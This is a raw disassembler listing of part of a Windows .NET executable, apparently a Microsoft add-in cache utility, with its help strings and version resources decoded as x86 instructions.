  407409:	arpl   WORD PTR [eax+0x65],bp
  40740c:	and    BYTE PTR [esi+0x69],ah
  40740f:	ins    BYTE PTR es:[edi],dx
  407410:	and    BYTE PTR gs:[ecx+0x6e],ch
  407414:	and    BYTE PTR [eax+ebp*2+0x65],dh
  407418:	and    BYTE PTR [ebx+0x70],dh
  40741b:	arpl   WORD PTR gs:[ecx+0x66],bp
  40741f:	imul   esp,DWORD PTR [ebp+0x64],0x6c6f6620
  407426:	fs gs jb 0x407456
  40742a:	and    BYTE PTR ds:0x666e690a,cl
  407430:	outs   dx,DWORD PTR ds:[esi]
  407431:	jb     0x4074a0
  407433:	imul   ebp,DWORD PTR [esi+0x67],0x65687420
  40743a:	and    BYTE PTR [ecx+0x64],ah
  40743d:	fs sub eax,0x6d206e69
  407443:	outs   dx,DWORD PTR ds:[esi]
  407444:	fs gs ins BYTE PTR es:[edi],dx
  407447:	and    BYTE PTR [eax+ebp*2+0x61],dh
  40744b:	je     0x40746d
  40744d:	outs   dx,BYTE PTR ds:[esi]
  40744e:	gs ja  0x407471
  407451:	popa   
  407452:	fs fs sub eax,0x73206e69
  407459:	gs ins DWORD PTR es:[di],dx
  40745c:	outs   dx,BYTE PTR gs:[esi]
  40745e:	je     0x4074d3
  407460:	and    BYTE PTR [eax+0x61],ch
  407463:	jbe    0x4074ca
  407465:	and    BYTE PTR [edx+0x65],ah
  407468:	outs   dx,BYTE PTR gs:[esi]
  40746a:	and    BYTE PTR [ebp+eiz*2+0x70],ah
  40746e:	ins    BYTE PTR es:[edi],dx
  40746f:	outs   dx,DWORD PTR ds:[esi]
  407470:	jns    0x4074d7
  407472:	and    BYTE PTR fs:[ecx+0x6e],ch
  407476:	je     0x4074e7
  407478:	and    BYTE PTR ds:0x6968740a,cl
  40747e:	jae    0x4074a0
  407480:	outs   dx,WORD PTR ds:[esi]
  407482:	ins    BYTE PTR es:[edi],dx
  407483:	fs gs jb 0x4074b5
  407487:	and    BYTE PTR [eax],ah
  407489:	push   esp
  40748a:	push   0x69702065
  40748f:	jo     0x4074f6
  407491:	ins    BYTE PTR es:[edi],dx
  407492:	imul   ebp,DWORD PTR [esi+0x65],0x6f6f7220
  407499:	je     0x4074bb
  40749b:	jae    0x407505
  40749d:	outs   dx,DWORD PTR ds:[esi]
  40749e:	jne    0x40750c
  4074a0:	and    BYTE PTR fs:[edx+0x65],ah
  4074a4:	and    BYTE PTR [ecx+0x20],ah
  4074a7:	outs   dx,WORD PTR ds:[esi]
  4074a9:	ins    BYTE PTR es:[edi],dx
  4074aa:	fs gs jb 0x4074ce
  4074ae:	arpl   WORD PTR [edi+0x6e],bp
  4074b1:	je     0x407514
  4074b3:	imul   ebp,DWORD PTR [esi+0x69],0x7320676e
  4074ba:	jne    0x40751e
  4074bc:	outs   dx,WORD PTR ds:[esi]
  4074be:	ins    BYTE PTR es:[edi],dx
  4074bf:	fs gs jb 0x407536
  4074c3:	and    BYTE PTR [esi+0x6f],ah
  4074c6:	jb     0x4074e8
  4074c8:	or     eax,0x7261760a
  4074cd:	imul   ebp,DWORD PTR [edi+0x75],0x64612073
  4074d4:	fs sub eax,0x73206e69
  4074da:	gs ins DWORD PTR es:[di],dx
  4074dd:	outs   dx,BYTE PTR gs:[esi]
  4074df:	je     0x407554
  4074e1:	and    BYTE PTR [ecx+ebp*2+0x6b],ch
  4074e5:	and    BYTE PTR gs:[eax+0x6f],ch
  4074e9:	jae    0x40755f
  4074eb:	and    BYTE PTR [ecx+0x64],ah
  4074ee:	popa   
  4074ef:	jo     0x407565
  4074f1:	gs jb  0x407567
  4074f4:	sub    al,0x20
  4074f6:	arpl   WORD PTR [edi+0x6e],bp
  4074f9:	je     0x40756d
  4074fb:	popa   
  4074fc:	arpl   WORD PTR [ebx+esi*2+0x2c],si
  407500:	and    BYTE PTR [ecx+0x6e],ah
  407503:	and    BYTE PTR [edi+0x70],ch
  407506:	je     0x407571
  407508:	outs   dx,DWORD PTR ds:[esi]
  407509:	outs   dx,BYTE PTR ds:[esi]
  40750a:	popa   
  40750b:	ins    BYTE PTR es:[edi],dx
  40750c:	and    BYTE PTR [ecx+0x64],al
  40750f:	fs dec ecx
  407511:	outs   dx,BYTE PTR ds:[esi]
  407512:	jae    0x407534
  407514:	or     eax,0x6275730a
  407519:	outs   dx,WORD PTR ds:[esi]
  40751b:	ins    BYTE PTR es:[edi],dx
  40751c:	fs gs jb 0x40754c
  407520:	and    BYTE PTR [ebp+0x74],ah
  407523:	arpl   WORD PTR [esi],bp
  407525:	and    BYTE PTR [eax],ah
  407527:	push   esp
  407528:	push   0x64412065
  40752d:	fs dec ecx
  40752f:	outs   dx,BYTE PTR ds:[esi]
  407530:	and    BYTE PTR [edx+0x6f],dl
  407533:	outs   dx,DWORD PTR ds:[esi]
  407534:	je     0x407556
  407536:	jo     0x407599
  407538:	je     0x4075a2
  40753a:	and    BYTE PTR [ebx+0x68],dh
  40753d:	outs   dx,DWORD PTR ds:[esi]
  40753e:	jne    0x4075ac
  407540:	and    BYTE PTR fs:[edx+0x65],ah
  407544:	and    BYTE PTR [ecx+0x20],ah
  407547:	outs   dx,WORD PTR ds:[esi]
  407549:	ins    BYTE PTR es:[edi],dx
  40754a:	fs gs jb 0x40756e
  40754e:	je     0x4075b8
  407550:	popa   
  407551:	je     0x407573
  407553:	arpl   WORD PTR [edi+0x6e],bp
  407556:	je     0x4075b9
  407558:	imul   ebp,DWORD PTR [esi+0x73],0x656e6f20
  40755f:	and    BYTE PTR ds:0x6275730a,cl
  407565:	outs   dx,WORD PTR ds:[esi]
  407567:	ins    BYTE PTR es:[edi],dx
  407568:	fs gs jb 0x40758c
  40756c:	outs   dx,WORD PTR ds:[esi]
  40756e:	jb     0x407590
  407570:	gs popa 
  407572:	arpl   WORD PTR [eax+0x20],bp
  407575:	popa   
  407576:	fs fs sub eax,0xd2e6e69
  40757d:	or     ah,BYTE PTR [eax]
  40757f:	dec    edi
  407580:	jo     0x4075f6
  407582:	imul   ebp,DWORD PTR [edi+0x6e],0xa0d3a73
  407589:	and    BYTE PTR [eax],ah
  40758b:	sub    eax,0x75626552
  407590:	imul   ebp,DWORD PTR [esp+eiz*2+0x20],0x6f462020
  407598:	jb     0x4075fd
  40759a:	imul   esp,DWORD PTR [edx+0x6c],0x65722079
  4075a1:	bound  esi,QWORD PTR [ebp+0x69]
  4075a4:	ins    BYTE PTR es:[edi],dx
  4075a5:	and    BYTE PTR fs:[eax+ebp*2+0x65],dh
  4075aa:	and    BYTE PTR [ebx+0x61],ah
  4075ad:	arpl   WORD PTR [eax+0x65],bp
  4075b0:	and    BYTE PTR [esi+0x69],ah
  4075b3:	ins    BYTE PTR es:[edi],dx
  4075b4:	gs sub al,0x20
  4075b7:	gs jbe 0x40761f
  4075ba:	outs   dx,BYTE PTR ds:[esi]
  4075bb:	and    BYTE PTR [ecx+0x66],ch
  4075be:	and    BYTE PTR [esi+0x6f],ch
  4075c1:	je     0x4075e3
  4075c3:	outs   dx,BYTE PTR ds:[esi]
  4075c4:	arpl   WORD PTR gs:[ebp+0x73],sp
  4075c8:	jae    0x40762b
  4075ca:	jb     0x407645
  4075cc:	cs or  eax,0x2d20200a
  4075d2:	push   ebx
  4075d3:	imul   ebp,DWORD PTR [ebp+eiz*2+0x6e],0x20202074
  4075db:	and    BYTE PTR [ecx+0x67],cl
  4075de:	outs   dx,BYTE PTR ds:[esi]
  4075df:	outs   dx,DWORD PTR ds:[esi]
  4075e0:	jb     0x407647
  4075e2:	and    BYTE PTR [edi+0x61],dh
  4075e5:	jb     0x407655
  4075e7:	imul   ebp,DWORD PTR [esi+0x67],0x62612073
  4075ee:	outs   dx,DWORD PTR ds:[esi]
  4075ef:	jne    0x407665
  4075f1:	and    BYTE PTR [edx+0x72],ah
  4075f4:	outs   dx,DWORD PTR ds:[esi]
  4075f5:	imul   esp,DWORD PTR [ebp+0x6e],0x20
  4075f9:	popa   
  4075fa:	fs fs sub eax,0x2c736e69
  407601:	and    BYTE PTR [ebp+0x74],ah
  407604:	arpl   WORD PTR [esi],bp
  407606:	add    DWORD PTR [edi+edx*2],ecx
  407609:	popa   
  40760a:	jb     0x40767a
  40760c:	imul   ebp,DWORD PTR [esi+0x67],0x307b203a
  407613:	jge    0x40759e
  407615:	mov    ds:0xf827a03f,eax
  40761a:	(bad)  [ebx+0xa]
  40761d:	loopne 0x40767a
  40761f:	dec    esp
  407620:	pushf  
  407621:	cld    
  407622:	push   ebp
  407623:	xor    al,0x1c
  407625:	ss add dh,bh
  407628:	(bad)  
  407629:	out    dx,al
  40762a:	and    al,0x60
  40762c:	mov    edi,0x69baa69b
  407631:	(bad)  
  407633:	inc    esp
  407634:	mov    edi,0x5e9714c2
  407639:	xchg   edi,eax
  40763a:	pop    edx
  40763b:	ds pop ebx
  40763d:	mov    ch,0x7b
  40763f:	repz cdq 
  407641:	lods   al,BYTE PTR ds:[esi]
  407642:	shr    ebp,0xb1
  407645:	stos   DWORD PTR es:[edi],eax
  407646:	push   0xfddcda71
  40764b:	dec    dh
  40764d:	retf   0x7013
  407650:	jo     0x4076cc
  407652:	or     ecx,esp
  407654:	cmp    al,0xd8
  407656:	(bad)  
  407657:	lock fisttp WORD PTR [esi-0x4586fc2e]
  40765e:	std    
  40765f:	shr    dl,cl
  407661:	pop    esp
  407662:	adc    ebp,edi
  407664:	push   eax
  407665:	cs jecxz 0x407639
  407668:	pop    ecx
  407669:	ror    cl,0x37
  40766c:	and    BYTE PTR [ebx],al
  40766e:	cwde   
  40766f:	xor    BYTE PTR [edi-0x12],0x74
  407673:	ret    0xed0c
  407676:	(bad)  
  407677:	loopne 0x40763a
  407679:	mov    WORD PTR [edi+ecx*1+0x175fa572],cs
  407680:	shr    BYTE PTR [eax],0x17
  407683:	gs icebp 
  407685:	call   0xf2a8:0xef649ce6
  40768c:	xchg   ebx,eax
  40768d:	(bad)  
  40768e:	pop    es
  40768f:	out    0xbe,eax
  407691:	pop    edx
  407692:	ds xchg esp,eax
  407694:	inc    edx
  407695:	imul   edi,ecx,0x54
  407698:	xor    al,0x6
  40769a:	popf   
  40769b:	or     DWORD PTR [edi+0x65efd68],ecx
  4076a1:	mov    dh,ch
  4076a3:	(bad)  
  4076a4:	cmp    ecx,DWORD PTR [eax]
  4076a6:	rcl    DWORD PTR [edx],1
  4076a8:	shl    BYTE PTR [ebx-0x73c540dd],cl
  4076ae:	and    BYTE PTR [ebx+0x65],0x87
  4076b2:	push   cs
  4076b3:	ja     0x4076cb
  4076b5:	jle    0x4076d7
  4076b7:	test   DWORD PTR [esi+0x50],edx
  4076ba:	xchg   esp,eax
  4076bb:	in     eax,dx
  4076bc:	test   DWORD PTR [edi-0x26],esi
  4076bf:	mov    es,WORD PTR [eax+ebx*8+0x38]
  4076c3:	repnz call 0xc872:0x690eb4fe
  4076cb:	xor    DWORD PTR [edi+0xc],edx
  4076ce:	jb     0x407671
  4076d0:	and    DWORD PTR [edi],edi
  4076d2:	les    ecx,FWORD PTR [edx+0x43]
  4076d5:	outs   dx,BYTE PTR ds:[esi]
  4076d6:	dec    esp
  4076d7:	pusha  
  4076d8:	retf   
  4076d9:	fdiv   DWORD PTR [ebx-0x70edb79b]
  4076df:	adc    al,0x3
  4076e1:	add    DWORD PTR [ebx],ecx
  4076e3:	or     eax,0xf0a5823c
  4076e8:	xchg   edi,eax
  4076e9:	xlat   BYTE PTR ds:[ebx]
  4076ea:	xor    DWORD PTR [eax-0x51],edx
  4076ed:	sbb    dl,BYTE PTR [esp+ebp*1]
  4076f0:	les    esi,FWORD PTR [eax]
  4076f2:	imul   eax,DWORD PTR [ebx],0xc76a3593
  4076f8:	jb     0x40771f
  4076fa:	sub    al,0x51
  4076fc:	add    al,0x2e
  4076fe:	mov    edi,0x5a59783f
  407703:	mov    bh,0xaf
  407705:	por    mm2,mm0
  407708:	pop    edi
  407709:	xor    bl,BYTE PTR [esi]
  40770b:	pop    ecx
  40770c:	cld    
  40770d:	cmp    ecx,edi
  40770f:	sbb    eax,0x27482e81
  407714:	add    BYTE PTR [eax],al
  407716:	add    BYTE PTR [eax],al
  407718:	cmp    al,0xc6
  40771a:	imul   edx,DWORD PTR [ebp+0x0],0x0
  40771e:	add    BYTE PTR [eax],al
  407720:	add    al,BYTE PTR [eax]
  407722:	add    BYTE PTR [eax],al
  407724:	add    BYTE PTR es:[eax],al
  407727:	add    BYTE PTR [eax],dh
  407729:	ja     0x40772b
  40772b:	add    BYTE PTR [eax],dh
  40772d:	pop    ecx
  40772e:	add    BYTE PTR [eax],al
  407730:	push   edx
  407731:	push   ebx
  407732:	inc    esp
  407733:	push   ebx
  407734:	test   BYTE PTR es:[ecx+0x3f],dl
  407738:	cmp    DWORD PTR [esi],esi
  40773a:	pop    esp
  40773b:	inc    edx
  40773c:	xchg   edx,eax
  40773d:	add    DWORD PTR [eax+0x2],eax
  407740:	aam    0xa0
  407742:	mov    dl,0x15
  407744:	add    DWORD PTR [eax],eax
  407746:	add    BYTE PTR [eax],al
  407748:	inc    ecx
  407749:	fs fs dec ecx
  40774c:	outs   dx,BYTE PTR ds:[esi]
  40774d:	push   ebp
  40774e:	je     0x4077b9
  407750:	ins    BYTE PTR es:[edi],dx
  407751:	cs jo  0x4077b8
  407754:	bound  eax,QWORD PTR [eax]
	...
  40779a:	add    bl,al
  40779c:	ja     0x40779e
	...
  4077a6:	add    ch,bl
  4077a8:	ja     0x4077aa
  4077aa:	add    BYTE PTR [eax],al
  4077ac:	and    BYTE PTR [eax],al
	...
  4077c2:	add    bh,cl
  4077c4:	ja     0x4077c6
	...
  4077ce:	add    BYTE PTR [eax],al
  4077d0:	add    BYTE PTR [edi+0x43],bl
  4077d3:	outs   dx,DWORD PTR ds:[esi]
  4077d4:	jb     0x40781b
  4077d6:	js     0x40783d
  4077d8:	dec    ebp
  4077d9:	popa   
  4077da:	imul   ebp,DWORD PTR [esi+0x0],0x6f63736d
  4077e1:	jb     0x407848
  4077e3:	gs cs fs ins BYTE PTR es:[edi],dx
  4077e7:	ins    BYTE PTR es:[edi],dx
  4077e8:	add    BYTE PTR [eax],al
  4077ea:	add    BYTE PTR [eax],al
  4077ec:	add    BYTE PTR [eax],al
  4077ee:	jmp    DWORD PTR ds:0x402000

Disassembly of section .rsrc:

00408000 <.rsrc>:
	...
  40800c:	add    BYTE PTR [eax],al
  40800e:	add    al,BYTE PTR [eax]
  408010:	adc    BYTE PTR [eax],al
  408012:	add    BYTE PTR [eax],al
  408014:	and    BYTE PTR [eax],al
  408016:	add    BYTE PTR [eax+0x18],al
  40801c:	push   eax
  40801d:	add    BYTE PTR [eax],al
  40801f:	add    BYTE PTR [eax],0x0
	...
  40802e:	add    DWORD PTR [eax],eax
  408030:	add    DWORD PTR [eax],eax
  408032:	add    BYTE PTR [eax],al
  408034:	cmp    BYTE PTR [eax],al
  408036:	add    BYTE PTR [eax+0x0],al
	...
  408044:	add    BYTE PTR [eax],al
  408046:	add    DWORD PTR [eax],eax
  408048:	or     DWORD PTR [eax+eax*1],eax
  40804b:	add    BYTE PTR [eax+0x0],al
	...
  40805d:	add    BYTE PTR [ecx],al
  40805f:	add    BYTE PTR [ecx],al
  408061:	add    BYTE PTR [eax],al
  408063:	add    BYTE PTR [eax+0x0],ch
  408066:	add    BYTE PTR [eax+0x0],al
	...
  408074:	add    BYTE PTR [eax],al
  408076:	add    DWORD PTR [eax],eax
  408078:	or     DWORD PTR [eax+eax*1],eax
  40807b:	add    BYTE PTR [eax+0x4],dl
  40807e:	add    BYTE PTR [eax],al
  408080:	nop
  408081:	add    BYTE PTR [eax],0x0
  408084:	rol    BYTE PTR [ebx],0x0
	...
  40808f:	add    al,al
  408091:	add    esi,DWORD PTR [eax+eax*1]
  408094:	add    BYTE PTR [eax],al
  408096:	push   esi
  408097:	add    BYTE PTR [ebx+0x0],dl
  40809a:	pop    edi
  40809b:	add    BYTE PTR [esi+0x0],dl
  40809e:	inc    ebp
  40809f:	add    BYTE PTR [edx+0x0],dl
  4080a2:	push   ebx
  4080a3:	add    BYTE PTR [ecx+0x0],cl
  4080a6:	dec    edi
  4080a7:	add    BYTE PTR [esi+0x0],cl
  4080aa:	pop    edi
  4080ab:	add    BYTE PTR [ecx+0x0],cl
  4080ae:	dec    esi
  4080af:	add    BYTE PTR [esi+0x0],al
  4080b2:	dec    edi
  4080b3:	add    BYTE PTR [eax],al
  4080b5:	add    BYTE PTR [eax],al
  4080b7:	add    BYTE PTR [ebp+0xfeef04],bh
  4080bd:	add    BYTE PTR [ecx],al
  4080bf:	add    BYTE PTR [esi],al
  4080c1:	add    BYTE PTR [eax+eax*1],al
  4080c4:	add    BYTE PTR [eax],al
  4080c6:	dec    edi
  4080c7:	add    BYTE PTR [eax],al
  4080c9:	add    BYTE PTR [eax+eax*1],al
  4080cc:	add    BYTE PTR [eax],al
  4080ce:	outs   dx,DWORD PTR ds:[esi]
  4080cf:	jbe    0x408110
  4080d1:	add    BYTE PTR [eax],al
  4080d3:	add    BYTE PTR [eax],cl
  4080d5:	add    BYTE PTR [eax],al
  4080d7:	add    BYTE PTR [eax+eax*1],al
  4080da:	add    BYTE PTR [eax],al
  4080dc:	add    DWORD PTR [eax],eax
	...
  4080ea:	add    BYTE PTR [eax],al
  4080ec:	and    BYTE PTR [ebx],al
  4080ee:	add    BYTE PTR [eax],al
  4080f0:	add    DWORD PTR [eax],eax
  4080f2:	push   ebx
  4080f3:	add    BYTE PTR [eax+eax*1+0x72],dh
  4080f7:	add    BYTE PTR [ecx+0x0],ch
  4080fa:	outs   dx,BYTE PTR ds:[esi]
  4080fb:	add    BYTE PTR [edi+0x0],ah
  4080fe:	inc    esi
  4080ff:	add    BYTE PTR [ecx+0x0],ch
  408102:	ins    BYTE PTR es:[edi],dx
  408103:	add    BYTE PTR [ebp+0x0],ah
  408106:	dec    ecx
  408107:	add    BYTE PTR [esi+0x0],ch
  40810a:	data16 add BYTE PTR [edi+0x0],ch
  40810e:	add    BYTE PTR [eax],al
  408110:	cld    
  408111:	add    al,BYTE PTR [eax]
  408113:	add    BYTE PTR [ecx],al
  408115:	add    BYTE PTR [eax],dh
  408117:	add    BYTE PTR [eax+eax*1],dh
  40811a:	xor    BYTE PTR [eax],al
  40811c:	cmp    DWORD PTR [eax],eax
  40811e:	xor    BYTE PTR [eax],al
  408120:	xor    al,0x0
  408122:	inc    edx
  408123:	add    BYTE PTR [eax],dh
  408125:	add    BYTE PTR [eax],al
  408127:	add    BYTE PTR [eax+eax*1+0x16],cl
  40812b:	add    BYTE PTR [ecx],al
  40812d:	add    BYTE PTR [ebx+0x0],al
  408130:	outs   dx,DWORD PTR ds:[esi]
  408131:	add    BYTE PTR [ebp+0x0],ch
  408134:	jo     0x408136
  408136:	popa   
  408137:	add    BYTE PTR [esi+0x0],ch
  40813a:	jns    0x40813c
  40813c:	dec    esi
  40813d:	add    BYTE PTR [ecx+0x0],ah
  408140:	ins    DWORD PTR es:[edi],dx
  408141:	add    BYTE PTR [ebp+0x0],ah
  408144:	add    BYTE PTR [eax],al
  408146:	add    BYTE PTR [eax],al
  408148:	dec    ebp
  408149:	add    BYTE PTR [ecx+0x0],ch
  40814c:	arpl   WORD PTR [eax],ax
  40814e:	jb     0x408150
  408150:	outs   dx,DWORD PTR ds:[esi]
  408151:	add    BYTE PTR [ebx+0x0],dh
  408154:	outs   dx,DWORD PTR ds:[esi]
  408155:	add    BYTE PTR [esi+0x0],ah
  408158:	je     0x40815a
  40815a:	and    BYTE PTR [eax],al
  40815c:	inc    ebx
  40815d:	add    BYTE PTR [edi+0x0],ch
  408160:	jb     0x408162
  408162:	jo     0x408164
  408164:	outs   dx,DWORD PTR ds:[esi]
  408165:	add    BYTE PTR [edx+0x0],dh
  408168:	popa   
  408169:	add    BYTE PTR [eax+eax*1+0x69],dh
  40816d:	add    BYTE PTR [edi+0x0],ch
  408170:	outs   dx,BYTE PTR ds:[esi]
  408171:	add    BYTE PTR [eax],al
  408173:	add    BYTE PTR [eax+eax*1+0xe],al
  408177:	add    BYTE PTR [ecx],al
  408179:	add    BYTE PTR [esi+0x0],al
  40817c:	imul   eax,DWORD PTR [eax],0x65006c
  408182:	inc    esp
  408183:	add    BYTE PTR [ebp+0x0],ah
  408186:	jae    0x408188
  408188:	arpl   WORD PTR [eax],ax
  40818a:	jb     0x40818c
  40818c:	imul   eax,DWORD PTR [eax],0x740070
  408192:	imul   eax,DWORD PTR [eax],0x6e006f
  408198:	add    BYTE PTR [eax],al
  40819a:	add    BYTE PTR [eax],al
  40819c:	inc    ecx
  40819d:	add    BYTE PTR [eax+eax*1+0x64],ah
  4081a1:	add    BYTE PTR [ecx+0x0],cl
  4081a4:	outs   dx,BYTE PTR ds:[esi]
  4081a5:	add    BYTE PTR [ebp+0x0],dl
  4081a8:	je     0x4081aa
  4081aa:	imul   eax,DWORD PTR [eax],0x2e006c
  4081b0:	add    BYTE PTR gs:[eax+0x0],bh
  4081b4:	add    BYTE PTR gs:[eax],al
  4081b7:	add    BYTE PTR [edx+0x0],bl
  4081ba:	sbb    eax,0x46000100
  4081bf:	add    BYTE PTR [ecx+0x0],ch
  4081c2:	ins    BYTE PTR es:[edi],dx
  4081c3:	add    BYTE PTR [ebp+0x0],ah
  4081c6:	push   esi
  4081c7:	add    BYTE PTR [ebp+0x0],ah
  4081ca:	jb     0x4081cc
  4081cc:	jae    0x4081ce
  4081ce:	imul   eax,DWORD PTR [eax],0x6e006f
  4081d4:	add    BYTE PTR [eax],al
  4081d6:	add    BYTE PTR [eax],al
  4081d8:	xor    al,0x0
  4081da:	add    BYTE PTR cs:[esi],dh
  4081dd:	add    BYTE PTR [esi],ch
  4081df:	add    BYTE PTR [edi],dh
  4081e1:	add    BYTE PTR [ecx],bh
  4081e3:	add    BYTE PTR [esi],ch
  4081e5:	add    BYTE PTR [eax],dh
  4081e7:	add    BYTE PTR [eax],ah
  4081e9:	add    BYTE PTR [edx+0x0],ah
  4081ec:	jne    0x4081ee
  4081ee:	imul   eax,DWORD PTR [eax],0x74006c
  4081f4:	and    BYTE PTR [eax],al
  4081f6:	bound  eax,QWORD PTR [eax]
  4081f8:	jns    0x4081fa
  4081fa:	cmp    al,BYTE PTR [eax]
  4081fc:	and    BYTE PTR [eax],al
  4081fe:	dec    esi
  4081ff:	add    BYTE PTR [ebp+0x0],al
  408202:	push   esp
  408203:	add    BYTE PTR [esi+0x0],al
  408206:	pop    eax
  408207:	add    BYTE PTR [edx+0x0],dl
  40820a:	inc    ebp
  40820b:	add    BYTE PTR [eax+eax*1+0x32],cl
  40820f:	add    BYTE PTR [eax],al
  408211:	add    BYTE PTR [eax],al
  408213:	add    BYTE PTR [eax+eax*1],bh
  408216:	push   cs
  408217:	add    BYTE PTR [ecx],al
  408219:	add    BYTE PTR [ecx+0x0],cl
  40821c:	outs   dx,BYTE PTR ds:[esi]
  40821d:	add    BYTE PTR [eax+eax*1+0x65],dh
  408221:	add    BYTE PTR [edx+0x0],dh
  408224:	outs   dx,BYTE PTR ds:[esi]
  408225:	add    BYTE PTR [ecx+0x0],ah
  408228:	ins    BYTE PTR es:[edi],dx
  408229:	add    BYTE PTR [esi+0x0],cl
  40822c:	popa   
  40822d:	add    BYTE PTR [ebp+0x0],ch
  408230:	add    BYTE PTR gs:[eax],al
  408233:	add    BYTE PTR [ecx+0x0],al
  408236:	add    BYTE PTR fs:[eax+eax*1+0x49],ah
  40823b:	add    BYTE PTR [esi+0x0],ch
  40823e:	push   ebp
  40823f:	add    BYTE PTR [eax+eax*1+0x69],dh
  408243:	add    BYTE PTR [eax+eax*1+0x2e],ch
  408247:	add    BYTE PTR [ebp+0x0],ah
  40824a:	js     0x40824c
  40824c:	add    BYTE PTR gs:[eax],al
  40824f:	add    BYTE PTR [edx+0x1002f00],al
  408255:	add    BYTE PTR [eax+eax*1+0x65],cl
  408259:	add    BYTE PTR [edi+0x0],ah
  40825c:	popa   
  40825d:	add    BYTE PTR [eax+eax*1+0x43],ch
  408261:	add    BYTE PTR [edi+0x0],ch
  408264:	jo     0x408266
  408266:	jns    0x408268
  408268:	jb     0x40826a
  40826a:	imul   eax,DWORD PTR [eax],0x680067
  408270:	je     0x408272
  408272:	add    BYTE PTR [eax],al
  408274:	test   eax,0x4d002000
  408279:	add    BYTE PTR [ecx+0x0],ch
  40827c:	arpl   WORD PTR [eax],ax
  40827e:	jb     0x408280
  408280:	outs   dx,DWORD PTR ds:[esi]
  408281:	add    BYTE PTR [ebx+0x0],dh
  408284:	outs   dx,DWORD PTR ds:[esi]
  408285:	add    BYTE PTR [esi+0x0],ah
  408288:	je     0x40828a
  40828a:	and    BYTE PTR [eax],al
  40828c:	inc    ebx
  40828d:	add    BYTE PTR [edi+0x0],ch
  408290:	jb     0x408292
  408292:	jo     0x408294
  408294:	outs   dx,DWORD PTR ds:[esi]
  408295:	add    BYTE PTR [edx+0x0],dh
  408298:	popa   
  408299:	add    BYTE PTR [eax+eax*1+0x69],dh
  40829d:	add    BYTE PTR [edi+0x0],ch
  4082a0:	outs   dx,BYTE PTR ds:[esi]
  4082a1:	add    BYTE PTR [esi],ch
  4082a3:	add    BYTE PTR [eax],ah
  4082a5:	add    BYTE PTR [eax],ah
  4082a7:	add    BYTE PTR [ecx+0x0],al
  4082aa:	ins    BYTE PTR es:[edi],dx
  4082ab:	add    BYTE PTR [eax+eax*1+0x20],ch
  4082af:	add    BYTE PTR [edx+0x0],dh
  4082b2:	imul   eax,DWORD PTR [eax],0x680067
  4082b8:	je     0x4082ba
  4082ba:	jae    0x4082bc
  4082bc:	and    BYTE PTR [eax],al
  4082be:	jb     0x4082c0
  4082c0:	add    BYTE PTR gs:[ebx+0x0],dh
  4082c4:	add    BYTE PTR gs:[edx+0x0],dh
  4082c8:	jbe    0x4082ca
  4082ca:	add    BYTE PTR gs:[eax+eax*1+0x2e],ah
  4082cf:	add    BYTE PTR [eax],al
  4082d1:	add    BYTE PTR [eax],al
  4082d3:	add    BYTE PTR [eax+eax*1+0xe],al
  4082d7:	add    BYTE PTR [ecx],al
  4082d9:	add    BYTE PTR [edi+0x0],cl
  4082dc:	jb     0x4082de
  4082de:	imul   eax,DWORD PTR [eax],0x690067
  4082e4:	outs   dx,BYTE PTR ds:[esi]
  4082e5:	add    BYTE PTR [ecx+0x0],ah
  4082e8:	ins    BYTE PTR es:[edi],dx
  4082e9:	add    BYTE PTR [esi+0x0],al
  4082ec:	imul   eax,DWORD PTR [eax],0x65006c
  4082f2:	outs   dx,BYTE PTR ds:[esi]
  4082f3:	add    BYTE PTR [ecx+0x0],ah
  4082f6:	ins    DWORD PTR es:[edi],dx
  4082f7:	add    BYTE PTR [ebp+0x0],ah
  4082fa:	add    BYTE PTR [eax],al
  4082fc:	inc    ecx
  4082fd:	add    BYTE PTR [eax+eax*1+0x64],ah
  408301:	add    BYTE PTR [ecx+0x0],cl
  408304:	outs   dx,BYTE PTR ds:[esi]
  408305:	add    BYTE PTR [ebp+0x0],dl
  408308:	je     0x40830a
  40830a:	imul   eax,DWORD PTR [eax],0x2e006c
  408310:	add    BYTE PTR gs:[eax+0x0],bh
  408314:	add    BYTE PTR gs:[eax],al
  408317:	add    BYTE PTR [eax+eax*1+0x1a],dl
  40831b:	add    BYTE PTR [ecx],al
  40831d:	add    BYTE PTR [eax+0x0],dl
  408320:	jb     0x408322
  408322:	outs   dx,DWORD PTR ds:[esi]
  408323:	add    BYTE PTR [eax+eax*1+0x75],ah
  408327:	add    BYTE PTR [ebx+0x0],ah
  40832a:	je     0x40832c
  40832c:	dec    esi
  40832d:	add    BYTE PTR [ecx+0x0],ah
  408330:	ins    DWORD PTR es:[edi],dx
  408331:	add    BYTE PTR [ebp+0x0],ah
  408334:	add    BYTE PTR [eax],al
  408336:	add    BYTE PTR [eax],al
  408338:	dec    ebp
  408339:	add    BYTE PTR [ecx+0x0],ch
  40833c:	arpl   WORD PTR [eax],ax
  40833e:	jb     0x408340
  408340:	outs   dx,DWORD PTR ds:[esi]
  408341:	add    BYTE PTR [ebx+0x0],dh
  408344:	outs   dx,DWORD PTR ds:[esi]
  408345:	add    BYTE PTR [esi+0x0],ah
  408348:	je     0x40834a
  40834a:	scas   al,BYTE PTR es:[edi]
  40834b:	add    BYTE PTR [eax],ah
  40834d:	add    BYTE PTR [esi],ch
  40834f:	add    BYTE PTR [esi+0x0],cl
  408352:	inc    ebp
  408353:	add    BYTE PTR [eax+eax*1+0x20],dl
  408357:	add    BYTE PTR [esi+0x0],al
  40835a:	jb     0x40835c
  40835c:	popa   
  40835d:	add    BYTE PTR [ebp+0x0],ch
  408360:	add    BYTE PTR gs:[edi+0x0],dh
  408364:	outs   dx,DWORD PTR ds:[esi]
  408365:	add    BYTE PTR [edx+0x0],dh
  408368:	imul   eax,DWORD PTR [eax],0x0
  40836b:	add    BYTE PTR [esi],dh
  40836d:	add    BYTE PTR [ecx],cl
  40836f:	add    BYTE PTR [ecx],al
  408371:	add    BYTE PTR [eax+0x0],dl
  408374:	jb     0x408376
  408376:	outs   dx,DWORD PTR ds:[esi]
  408377:	add    BYTE PTR [eax+eax*1+0x75],ah
  40837b:	add    BYTE PTR [ebx+0x0],ah
  40837e:	je     0x408380
  408380:	push   esi
  408381:	add    BYTE PTR [ebp+0x0],ah
  408384:	jb     0x408386
  408386:	jae    0x408388
  408388:	imul   eax,DWORD PTR [eax],0x6e006f
  40838e:	add    BYTE PTR [eax],al
  408390:	xor    al,0x0
  408392:	add    BYTE PTR cs:[esi],dh
  408395:	add    BYTE PTR [esi],ch
  408397:	add    BYTE PTR [edi],dh
  408399:	add    BYTE PTR [ecx],bh
  40839b:	add    BYTE PTR [esi],ch
  40839d:	add    BYTE PTR [eax],dh
